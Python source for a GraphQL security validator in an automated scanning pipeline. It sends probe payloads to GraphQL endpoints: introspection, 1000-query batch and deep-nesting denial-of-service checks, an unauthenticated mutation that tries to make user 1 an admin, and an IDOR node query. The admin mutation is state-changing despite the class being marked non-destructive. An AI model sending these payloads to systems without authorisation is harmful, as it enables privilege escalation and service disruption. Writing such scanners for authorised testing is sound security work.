from __future__ import annotations

import json
from typing import Any, Dict, List, Optional
from urllib.parse import urlsplit

import requests

from modules.pipeline.brain.fact_store import FactStore
from modules.pipeline.engine.models import Evidence, ExecutionContext, ValidationResult


class GraphQLValidator:
    SIGNALS = {"endpoint_patterns": ["/graphql", "/api/graphql", "/__graphql", "/gql"]}
    validator_id = "graphql_validator"
    priority = 90

    def __init__(self, context: Optional[ExecutionContext] = None):
        self.context = context
        self.destructive = False

    def can_run(self, state: Dict[str, Any]) -> bool:
        endpoints = [str(x).lower() for x in (state.get("endpoints") or [])]
        return any("graphql" in ep or ep.endswith("/gql") for ep in endpoints)

    def _graphql_targets(self, state: Dict[str, Any]) -> List[str]:
        endpoints = [ep for ep in (state.get("endpoints") or []) if isinstance(ep, str)]
        hits = [ep for ep in endpoints if any(p in ep.lower() for p in ["/graphql", "/api/graphql", "/__graphql", "/gql"])]
        if hits:
            return list(dict.fromkeys(hits))

        base = state.get("url") or state.get("target")
        if not isinstance(base, str) or not base:
            return []
        if base.startswith("http://") or base.startswith("https://"):
            root = f"{urlsplit(base).scheme}://{urlsplit(base).netloc}"
        else:
            root = f"https://{base.strip('/') }"
        return [f"{root}/graphql"]

    def _post(self, url: str, payload: Any, timeout: int, headers: Optional[Dict[str, str]] = None) -> requests.Response:
        h = {"User-Agent": "security-pipeline-validator/1.0", "Content-Type": "application/json"}
        if headers:
            h.update(headers)
        return requests.post(url, data=json.dumps(payload), headers=h, timeout=timeout, allow_redirects=False)

    def run(self, state: Dict[str, Any]):
        targets = self._graphql_targets(state)
        if not targets:
            return None

        timeout = int(state.get("timeout", 8) or 8)
        store = state.get("fact_store") if isinstance(state.get("fact_store"), FactStore) else FactStore()

        for target in targets:
            # 1) Introspection
            try:
                introspection = self._post(target, {"query": "{__schema{types{name}}}"}, timeout)
                body = introspection.text or ""
                if introspection.status_code == 200 and "__schema" in body:
                    store.add_confirmed_vulnerability(
                        vuln_id="graphql_introspection_enabled",
                        vuln_type="graphql_introspection_enabled",
                        target=target,
                        source_validator_id=self.validator_id,
                    )
                    return ValidationResult(
                        success=True,
                        confidence=0.95,
                        severity="medium",
                        vulnerability="graphql-introspection-enabled",
                        evidence=Evidence(
                            request={"target": target, "query": "{__schema{types{name}}}"},
                            response={"status": introspection.status_code, "snippet": body[:300]},
                            matched="__schema",
                        ),
                        impact="GraphQL introspection can expose internal schema and sensitive object relationships.",
                        remediation="Disable introspection in production or gate it behind authentication and strict authorization.",
                    )
            except Exception:
                pass

            # 2) Batch query DoS
            try:
                batch_payload = [{"query": "{__typename}"} for _ in range(1000)]
                batch = self._post(target, batch_payload, timeout)
                if batch.status_code >= 500:
                    return self._result(target, "graphql-batch-dos", "high", "batch_1000_triggered")
            except Exception:
                pass

            # 3) Deep nested query
            try:
                deep = "query{a{" * 10 + "id" + "}" * 10
                deep_resp = self._post(target, {"query": deep}, timeout)
                if deep_resp.status_code >= 500 or "timeout" in (deep_resp.text or "").lower():
                    return self._result(target, "graphql-deep-query-dos", "high", "deep_nesting")
            except Exception:
                pass

            # 4) Auth bypass on mutation
            try:
                mutation = self._post(target, {"query": "mutation { updateUser(id:\"1\", role:\"admin\") { id } }"}, timeout)
                if mutation.status_code == 200 and "errors" not in (mutation.text or "").lower():
                    return self._result(target, "graphql-auth-bypass-mutation", "high", "unauth_mutation")
            except Exception:
                pass

            # 5) IDOR via node query
            try:
                node_query = self._post(target, {"query": "query { node(id: \"USER_2\") { id } }"}, timeout)
                if node_query.status_code == 200 and "USER_2" in (node_query.text or ""):
                    return self._result(target, "graphql-idor-node-query", "high", "node_idor")
            except Exception:
                pass

            # 6) Field suggestion leakage
            try:
                typo = self._post(target, {"query": "{ usre { id } }"}, timeout)
                if "did you mean" in (typo.text or "").lower():
                    return self._result(target, "graphql-field-suggestion-leakage", "medium", "did_you_mean")
            except Exception:
                pass

        return ValidationResult(
            success=False,
            confidence=0.2,
            severity="info",
            vulnerability="graphql-security",
            evidence=Evidence(request={"targets": targets}, response="No GraphQL weakness confirmed", matched=""),
        )

    def _result(self, target: str, vuln: str, severity: str, matched: str) -> ValidationResult:
        store = FactStore()
        store.add_confirmed_vulnerability(vuln_id=vuln, vuln_type=vuln, target=target, source_validator_id=self.validator_id)
        return ValidationResult(
            success=True,
            confidence=0.9,
            severity=severity,
            vulnerability=vuln,
            evidence=Evidence(request={"target": target}, response={"status": "confirmed"}, matched=matched),
        )
